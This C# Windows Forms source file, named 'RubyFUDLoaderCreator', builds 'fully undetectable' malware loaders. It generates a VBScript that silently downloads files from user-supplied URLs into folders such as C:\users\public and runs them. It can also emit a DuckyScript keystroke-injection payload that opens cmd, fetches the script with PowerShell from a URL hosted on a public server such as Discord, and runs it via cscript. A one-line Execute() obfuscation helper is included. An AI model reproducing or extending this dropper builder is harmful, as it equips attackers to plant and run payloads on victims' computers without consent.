using System.Collections.Generic;
using System.IO;
using System.Security.Policy;
using System.Windows.Forms;
using static System.Net.Mime.MediaTypeNames;
using static System.Net.WebRequestMethods;

namespace RubyFUDLoaderCreator
{
    public partial class Form1 : Form
    {
        // List of int items
        private List<int> items = new List<int>();
        // List of profiles
        private List<Profile> profiles = new List<Profile>();

        string version = "1.0.0";


        public Form1()
        {
            InitializeComponent();
            lblVersion.Text = "Version: " + version;
        }

        private void btnAdd_Click(object sender, EventArgs e)
        {
            try
            {
                // Add a new item to the list
                if (items.Count == 0)
                    items.Add(items.Count);
                else
                    items.Add(items.Count);
            }
            catch (Exception ex)
            {
                Log("Error while adding item to array: " + ex.Message);
            }

            // Initialize the textbox inside of a groupbox
            TextBox txt = new TextBox();
            TextBox txtPath = new TextBox();
            CheckBox chk = new CheckBox();
            TextBox txt2 = new TextBox();
            Button btn = new Button();
            CheckBox chk2 = new CheckBox();

            // Add a new textbox to the form
            try
            {
                txt.Location = new Point(10, btnAdd.Location.Y + (txt.Height + 20) + (this.Controls.OfType<TextBox>().Count() * 15));
                txt.Width = 300;
                txt.Name = "txtURL" + (items.Count - 1);
                txt.Text = "https://google.com/files/Item.png" + (items.Count - 1);
                this.Controls.Add(txt);
            }
            catch (Exception ex)
            {
                Log("Error while adding textbox (URL) to form: " + ex.Message);
            }

            // Add a new textbox to the form right next to the textbox called "Path"
            try
            {
                txtPath.Location = new Point(txt.Location.X + txt.Width + 5, txt.Location.Y);

                txtPath.Width = 200;
                txtPath.Name = "txtPath" + (items.Count - 1);
                txtPath.Text = "C:\\users\\public";
                this.Controls.Add(txtPath);
            }
            catch (Exception ex)
            {
                Log("Error while adding textbox (URL) to form: " + ex.Message);
            }


            // Add a new checkbox to the form right next to the textbox
            try
            {
                chk.Location = new Point(txtPath.Location.X + txtPath.Width + 5, txtPath.Location.Y);
                chk.Name = "chk" + (items.Count - 1);
                chk.Text = "Custom Name";
                // Add handler for the checkbox
                chk.CheckedChanged += (s, ev) =>
                {
                    // Disable the textbox if the checkbox is unchecked
                    txt2.Enabled = chk.Checked;
                };
                // Check the checkbox by default
                chk.Checked = false;
                // Change width of the checkbox
                chk.Width = 130;
                this.Controls.Add(chk);
            }
            catch (Exception ex)
            {
                Log("Error while adding checkbox to form: " + ex.Message);
            }

            // Add a new textbox to the form right next to the checkbox
            try
            {
                txt2.Location = new Point(chk.Location.X + chk.Width, txt.Location.Y);
                txt2.Width = 200;
                txt2.Name = "txtCustomName" + (items.Count - 1);
                txt2.Text = "Item" + (items.Count - 1);
                txt2.Enabled = false;
                this.Controls.Add(txt2);
            }
            catch (Exception ex)
            {
                Log("Error while adding textbox (Custom Name) to form: " + ex.Message);
            }

            // Add button to remove the item
            try
            {
                btn.Location = new Point(txt2.Location.X + txt2.Width + 5, txt2.Location.Y);
                btn.Width = 100;
                btn.Height = 30;
                btn.Name = "btnRemove" + (items.Count - 1);
                btn.Text = "Remove";
                btn.Click += (s, ev) =>
                {
                    // Extract the index from the button name
                    int index = int.Parse(btn.Name.Replace("btnRemove", ""));
                    // Remove the item from the form
                    RemoveItem(index);
                };
                this.Controls.Add(btn);
            }
            catch (Exception ex)
            {
                Log("Error while adding button to form: " + ex.Message);
            }

            // Add checkbox to the right of the button and make it not checked by default
            try
            {
                chk2.Location = new Point(btn.Location.X + btn.Width + 5, btn.Location.Y);
                chk2.Name = "chk2" + (items.Count - 1);
                chk2.Text = "Executable";
                chk2.Checked = false;
                chk2.Width = 130;
                this.Controls.Add(chk2);
            }
            catch (Exception ex)
            {
                Log("Error while adding checkbox to form: " + ex.Message);
            }

            // Add as new profile to the list
            profiles.Add(new Profile
            {
                Url = txt.Text,
                Path = txtPath.Text,
                UseCustomName = chk.Checked,
                CustomName = txt2.Text,
                IsExecutable = chk2.Checked
            });

            // Log
            Log("Added item " + (items.Count - 1));
        }

        private void RemoveItem(int index)
        {
            // Remove the selected controls from the form
            try
            {
                this.Controls.RemoveByKey("txtURL" + index);
                this.Controls.RemoveByKey("txtPath" + index);
                this.Controls.RemoveByKey("chk" + index);
                this.Controls.RemoveByKey("txtCustomName" + index);
                this.Controls.RemoveByKey("btnRemove" + index);
                this.Controls.RemoveByKey("chk2" + index);
            }
            catch (Exception ex)
            {
                Log("Error while removing item from form: " + ex.Message);
            }

            // Remove the index from the counter array
            try
            {
                // Remove the item from the list
                items.RemoveAt(index);
                profiles.RemoveAt(index);
                // Update indices for controls after the removed index
                for (int i = index; i < items.Count; i++)
                {
                    Control txtURL = this.Controls.Find("txtURL" + (i + 1), true).FirstOrDefault();
                    if (txtURL != null) txtURL.Name = "txtURL" + i;

                    Control txtPath = this.Controls.Find("txtPath" + (i + 1), true).FirstOrDefault();
                    if (txtPath != null) txtPath.Name = "txtPath" + i;

                    Control chk = this.Controls.Find("chk" + (i + 1), true).FirstOrDefault();
                    if (chk != null) chk.Name = "chk" + i;

                    Control txtCustomName = this.Controls.Find("txtCustomName" + (i + 1), true).FirstOrDefault();
                    if (txtCustomName != null) txtCustomName.Name = "txtCustomName" + i;

                    Control btnRemove = this.Controls.Find("btnRemove" + (i + 1), true).FirstOrDefault();
                    if (btnRemove != null) btnRemove.Name = "btnRemove" + i;

                    Control chk2 = this.Controls.Find("chk2" + (i + 1), true).FirstOrDefault();
                    if (chk2 != null) chk2.Name = "chk2" + i;
                }
                // Log
                Log("Removed item " + index + " (Item: " + index + ") (Count: " + items.Count + ")");
            }
            catch (Exception ex)
            {
                Log("Error while removing item from array: (Item: " + index + ") " + "(Count: " + items.Count + ")" + Environment.NewLine + ex.Message);
                // Log all items in the array
                foreach (int i in items)
                {
                    Log("Item: " + i);
                }
            }
        }


        // Create a new FUD loader that uses the txtURL then installs into the txtCustomName as path
        private void btnBuild_Click(object sender, EventArgs e)
        {
            // Create a new FUD loader
            try
            {
                List<string> URLs = new List<string>(); // List that looks like: "https://example.com/file.exe;C:\users\public\file.exe"
                List<string> Executables = new List<string>();

                // Add all items to the loader
                foreach (int i in items)
                {
                    // Extract the controls
                    Control txtURL = this.Controls.Find("txtURL" + i, true).FirstOrDefault();
                    Control txtPath = this.Controls.Find("txtPath" + i, true).FirstOrDefault();
                    Control chk = this.Controls.Find("chk" + i, true).FirstOrDefault();
                    Control txtCustomName = this.Controls.Find("txtCustomName" + i, true).FirstOrDefault();
                    // Add the item to the loader
                    if (txtURL != null)
                    {
                        string url = txtURL.Text;
                        string path = txtPath.Text;

                        // Check if chk is checked
                        if (chk != null && chk is CheckBox && (chk as CheckBox).Checked)
                        {
                            if (txtCustomName != null)
                            {
                                string customName = txtCustomName.Text;
                                string fullPath = path + "\\" + customName;
                                URLs.Add(url + ";" + fullPath);
                            }
                        }
                        else
                        {
                            // Extract the filename from the URL
                            string[] parts = url.Split('/');
                            string filename = parts[parts.Length - 1];
                            string fullPath = path + "\\" + filename;

                            URLs.Add(url + ";" + fullPath);
                        }
                    }

                    // Check if the item is executable
                    Control chk2 = this.Controls.Find("chk2" + i, true).FirstOrDefault();
                    if (chk2 != null && chk2 is CheckBox && (chk2 as CheckBox).Checked)
                    {
                        if (chk != null && chk is CheckBox && (chk as CheckBox).Checked && txtCustomName != null)
                        {
                            // Extract the path from the custom path
                            string path = txtPath.Text;
                            string customName = txtCustomName.Text;
                            string fullPath = path + "\\" + customName;

                            Executables.Add(fullPath);
                        }
                        else
                        {
                            string path = txtPath.Text;
                            string url = txtURL.Text;

                            // Extract the filename from the URL
                            string[] parts = url.Split('/');
                            string filename = parts[parts.Length - 1];
                            string fullPath = path + "\\" + filename;

                            Executables.Add(fullPath);
                        }
                    }
                }
                // Build a payload that installs all the items and places them into the custom path
                try
                {
                    if (cbDuckyScript.Checked == true)
                    {
                        // Generate the main vbs script
                        bool SuccessfullBuild = BuildVBS();

                        if (SuccessfullBuild)
                        {
                            // Skicka en input dialog för att skriva en URL till payload filen som ligger på internet
                            // Skriv information om att användaren ska ladda upp skapade vbs filen till en webbserver (T.ex Discord) och sedan skriva URL till filen
                            string url = Microsoft.VisualBasic.Interaction.InputBox("Upload the created VBS file to a public webserver (E.g: Discord) and then write the URL below", "URL to uploaded VBS file", "https://example.com/file.vbs");

                            // Skapa en ny save file dialog
                            SaveFileDialog sfd = new SaveFileDialog();
                            sfd.InitialDirectory = Directory.GetCurrentDirectory();
                            sfd.Filter = "DuckyScript files (*.txt)|*.txt|All files (*.*)|*.*";
                            sfd.Title = "Save DuckyScript payload";
                            sfd.RestoreDirectory = true;

                            // Skapa en ny .txt fil i användarens valda plats
                            if (sfd.ShowDialog() == DialogResult.OK)
                            {
                                using (StreamWriter sw = new StreamWriter(sfd.FileName))
                                {
                                    sw.WriteLine("DELAY 1000");
                                    sw.WriteLine("GUI r");
                                    sw.WriteLine("DELAY 500");
                                    sw.WriteLine("STRING cmd");
                                    sw.WriteLine("ENTER");
                                    sw.WriteLine("DELAY 1500");
                                    sw.WriteLine($"STRING @powershell -Command \"(Invoke-WebRequest -Uri '{url}' -OutFile 'C:\\Users\\Public\\temp.vbs')\"");
                                    sw.WriteLine("ENTER");
                                    sw.WriteLine("DELAY 500");
                                    sw.WriteLine("STRING cscript /E:vbscript C:\\users\\public\\temp.vbs");
                                    sw.WriteLine("DELAY 500");
                                    sw.WriteLine("ENTER");
                                }
                            }
                        }
                    }
                    else
                    {
                        bool SuccessfullBuild = BuildVBS();
                    }

                }
                catch (Exception ex)
                {
                    Log("Error while creating payload file: " + ex.Message);
                }

            }
            catch (Exception ex)
            {
                Log("Error while creating FUD loader: " + ex.Message);
            }
        }


        // Function for building a VBS script, first asks for a save location and then creates the VBS script
        private bool BuildVBS()
        {
            // Ask user for a save location
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.InitialDirectory = Directory.GetCurrentDirectory();
            sfd.Filter = "VBS files (*.vbs)|*.vbs|All files (*.*)|*.*";
            sfd.Title = "Save VBS payload";
            sfd.RestoreDirectory = true;

            // Create a new .vbs file in users selected location
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                using (StreamWriter sw = new StreamWriter(sfd.FileName))
                {
                    try
                    {
                        sw.WriteLine("Option Explicit");
                        sw.WriteLine("On Error Resume Next");

                        sw.WriteLine("Dim objXMLHTTP, strFileURLs, strHDLocations, i");
                        sw.WriteLine("strFileURLs = Array(" + string.Join(", ", QuoteArrayUrl(profiles)) + ")");
                        sw.WriteLine("strHDLocations = Array(" + string.Join(", ", QuoteArrayPath(profiles)) + ")");
                        sw.WriteLine("Set objXMLHTTP = CreateObject(\"MSXML2.ServerXMLHTTP\")");
                        
                        sw.WriteLine("Dim objFSO");
                        sw.WriteLine("Set objFSO = CreateObject(\"Scripting.FileSystemObject\")");
                        sw.WriteLine("For i = LBound(strHDLocations) To UBound(strHDLocations)");
                        sw.WriteLine("Dim strDirectory");
                        sw.WriteLine("strDirectory = objFSO.GetParentFolderName(strHDLocations(i))");
                        sw.WriteLine("If Not objFSO.FolderExists(strDirectory) Then");
                        sw.WriteLine("objFSO.CreateFolder(strDirectory)");
                        sw.WriteLine("End If");
                        sw.WriteLine("Next");
                        sw.WriteLine("Set objFSO = Nothing");

                        sw.WriteLine("For i = LBound(strFileURLs) To UBound(strFileURLs)");
                        sw.WriteLine("Dim strFileURL, strFileName, strHDLocation");
                        sw.WriteLine("strFileURL = strFileURLs(i)");
                        sw.WriteLine("strFileName = Mid(strFileURL, InStrRev(strFileURL, \"/\") + 1)");
                        sw.WriteLine("strHDLocation = strHDLocations(i)");
                        sw.WriteLine("objXMLHTTP.Open \"GET\", strFileURL, False");
                        sw.WriteLine("objXMLHTTP.send");
                        sw.WriteLine("If objXMLHTTP.Status = 200 Then");
                        sw.WriteLine("Dim objADOStream");
                        sw.WriteLine("Set objADOStream = CreateObject(\"ADODB.Stream\")");
                        sw.WriteLine("objADOStream.Open");
                        sw.WriteLine("objADOStream.Type = 1");
                        sw.WriteLine("objADOStream.Write objXMLHTTP.ResponseBody");
                        sw.WriteLine("objADOStream.Position = 0");
                        sw.WriteLine("objADOStream.SaveToFile strHDLocation");
                        sw.WriteLine("objADOStream.Close");
                        sw.WriteLine("Set objADOStream = Nothing");
                        sw.WriteLine("End If");
                        sw.WriteLine("Next");
                        sw.WriteLine("Dim objShell");
                        sw.WriteLine("Set objShell = CreateObject(\"WScript.Shell\")");

                        // Add your executables here
                        List<string> executables = new List<string>();
                        // Find all executables by checking if the cb2 is checked on each profile
                        foreach (Profile profile in profiles)
                        {
                            if (profile.IsExecutable)
                            {
                                if (profile.UseCustomName)
                                {
                                    executables.Add(profile.Path + "\\" + profile.CustomName);
                                }
                                else
                                {
                                    string[] parts = profile.Url.Split('/');
                                    string filename = parts[parts.Length - 1];
                                    executables.Add(profile.Path + "\\" + filename);
                                }
                                // Log
                                Log("Added executable: " + executables[executables.Count - 1]);
                            }
                        }

                        foreach (string executableFile in executables)
                        {
                            sw.WriteLine("objShell.Run \"" + executableFile + "\", 1, False");
                        }

                        sw.WriteLine("Set objXMLHTTP = Nothing");

                        // Log
                        Log("Created VBS script successfully (Path: " + sfd.FileName + ")");
                        return true;
                    }
                    catch (Exception ex)
                    {
                        Log("Error while creating VBS script: " + ex.Message);
                        return false;
                    }
                }
            }

            return false;
        }

        private string[] QuoteArrayUrl(List<Profile> profiles)
        {
            List<string> elements = new List<string>();
            foreach (Profile profile in profiles)
            {
                elements.Add("\"" + profile.Url + "\"");
            }
            return elements.ToArray();
        }

        private string[] QuoteArrayPath(List<Profile> profiles)
        {
            List<string> elements = new List<string>();
            foreach (Profile profile in profiles)
            {
                // Get the path from the custom name if the checkbox is checked
                if (profile.UseCustomName)
                    elements.Add("\"" + profile.Path + "\\" + profile.CustomName + "\"");
                else
                    elements.Add("\"" + profile.Path + "\\" + profile.Url.Split('/')[profile.Url.Split('/').Length - 1] + "\"");
            }
            return elements.ToArray();
        }

        // Convert the VBS script to a one line string
        private string ConvertVBSToOneLine(string script)
        {
            string OrginalScript = script;
            OrginalScript = OrginalScript.Replace("\r\n", ":");
            OrginalScript = OrginalScript.Replace("\"", "\"\"");

            string ConvertScript = $"Execute(\"{OrginalScript}";
            ConvertScript += "\")";
            return ConvertScript;
        }


        // Log
        private void Log(string message)
        {
            txtLog.Text += message + Environment.NewLine;
        }

        private void btnListArray_Click(object sender, EventArgs e)
        {
            // Log all items in the array
            foreach (int i in items)
            {
                Log("Item: " + i);
            }
            // Total count
            Log("Total count: " + items.Count);
        }

        private void btnSave_Click(object sender, EventArgs e)
        {
            try
            {
                // Create a new save file dialog
                SaveFileDialog sfd = new SaveFileDialog();
                sfd.InitialDirectory = Directory.GetCurrentDirectory();
                sfd.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
                sfd.Title = "Save profiles";

                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    using (StreamWriter sw = new StreamWriter(sfd.FileName))
                    {
                        foreach (Profile profile in profiles)
                        {
                            // Update profile with latest values from form controls
                            UpdateProfileFromControls(profile);

                            // Serialize and save the profile
                            string serializedProfile = profile.Serialize();
                            sw.WriteLine(serializedProfile);
                        }
                    }
                    Log("Profiles saved successfully to: " + sfd.FileName);
                }
                else
                {
                    Log("Save operation cancelled by user.");
                }
            }
            catch (Exception ex)
            {
                Log("Error while saving profiles: " + ex.Message);
            }
        }

        private void UpdateProfileFromControls(Profile profile)
        {
            // Extract the index of the profile from the list of items
            int index = profiles.IndexOf(profile);
            // Log
            Log("Updating profile from controls: " + index);

            // Extract the controls
            Control txtURL = this.Controls.Find("txtURL" + index, true).FirstOrDefault();
            Control txtPath = this.Controls.Find("txtPath" + index, true).FirstOrDefault();
            Control chk = this.Controls.Find("chk" + index, true).FirstOrDefault();
            Control txtCustomName = this.Controls.Find("txtCustomName" + index, true).FirstOrDefault();
            Control chk2 = this.Controls.Find("chk2" + index, true).FirstOrDefault();

            if (txtURL != null)
                profile.Url = txtURL.Text;
            else
            {
                Log("txtURL" + index + " not found");
                // Remove the profile from the list
                profiles.RemoveAt(index);
            }
            if (txtPath != null)
                profile.Path = txtPath.Text;
            else
            {
                Log("txtPath" + index + " not found");
                // Remove the profile from the list
                profiles.RemoveAt(index);
            }
            if (chk != null && chk is CheckBox)
                profile.UseCustomName = (chk as CheckBox).Checked;
            else
            {
                Log("chk" + index + " not found");
                // Remove the profile from the list
                profiles.RemoveAt(index);
            }
            if (txtCustomName != null)
                profile.CustomName = txtCustomName.Text;
            else
            {
                Log("txtCustomName" + index + " not found");
                // Remove the profile from the list
                profiles.RemoveAt(index);
            }
            if (chk2 != null && chk2 is CheckBox)
                profile.IsExecutable = (chk2 as CheckBox).Checked;
            else
            {
                Log("chk2" + index + " not found");
                // Remove the profile from the list
                profiles.RemoveAt(index);
            }
               
            // Log
            Log($"Updated profile ({index}): {profile.Serialize()}");
        }

        private void btnLoad_Click(object sender, EventArgs e)
        {
            // Clear all items from the form
            try
            {
                // Begin from up to down
                for (int i = items.Count - 1; i >= 0; i--)
                {
                    RemoveItem(i);
                }
                Log("Cleared items from the form");

                profiles.Clear();
                Log("Cleared profiles list");
            }
            catch (Exception ex)
            {
                Log("Error while clearing items and profiles: " + ex.Message);
            }

            // Load profiles from a file
            try
            {
                // Create a new open file dialog
                OpenFileDialog ofd = new OpenFileDialog();
                ofd.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";
                ofd.Title = "Load profiles";
                ofd.ShowDialog();

                // Load the profiles from the file
                using (StreamReader sr = new StreamReader(ofd.FileName))
                {
                    string line;
                    while ((line = sr.ReadLine()) != null)
                    {
                        // Add the profile to the form
                        btnAdd_Click(null, null);
                        Profile profile = Profile.Deserialize(line);
                        profiles.Add(profile);

                        // Extract the index of the profile
                        int index = items.Count - 1;


                        // Extract the controls
                        Control txtURL = this.Controls.Find("txtURL" + index, true).FirstOrDefault();
                        Control txtPath = this.Controls.Find("txtPath" + index, true).FirstOrDefault();
                        Control chk = this.Controls.Find("chk" + index, true).FirstOrDefault();
                        Control txtCustomName = this.Controls.Find("txtCustomName" + index, true).FirstOrDefault();
                        Control chk2 = this.Controls.Find("chk2" + index, true).FirstOrDefault();

                        if (txtURL != null)
                            txtURL.Text = profile.Url;
                        else
                            Log("txtURL" + index + " not found");
                        if (txtPath != null)
                            txtPath.Text = profile.Path;
                        else
                            Log("txtPath" + index + " not found");
                        if (chk != null && chk is CheckBox)
                            (chk as CheckBox).Checked = profile.UseCustomName;
                        else
                            Log("chk" + index + " not found");
                        if (txtCustomName != null)
                            txtCustomName.Text = profile.CustomName;
                        else
                            Log("txtCustomName" + index + " not found");
                        if (chk2 != null && chk2 is CheckBox)
                            (chk2 as CheckBox).Checked = profile.IsExecutable;
                        else
                            Log("chk2" + index + " not found");

                        // Log
                        Log($"Loaded profile ({index}): {profile.Serialize()}");
                    }
                    sr.Close();
                }
                Log("Loaded profiles from file: " + ofd.FileName);
            }
            catch (Exception ex)
            {
                Log("Error while loading profiles: " + ex.Message);
            }
        }
    }

    public class Profile
    {
        public string Url { get; set; }
        public string Path { get; set; }
        public bool UseCustomName { get; set; }
        public string CustomName { get; set; }
        public bool IsExecutable { get; set; }

        // Add more properties as needed

        public string Serialize()
        {
            // Serialize profile to a string
            return $"{Url},{Path},{UseCustomName},{CustomName},{IsExecutable}";
        }

        public static Profile Deserialize(string data)
        {
            // Deserialize string to a profile object
            string[] parts = data.Split(',');
            return new Profile
            {
                Url = parts[0],
                Path = parts[1],
                UseCustomName = bool.Parse(parts[2]),
                CustomName = parts[3],
                IsExecutable = bool.Parse(parts[4])
            };
        }
    }
}
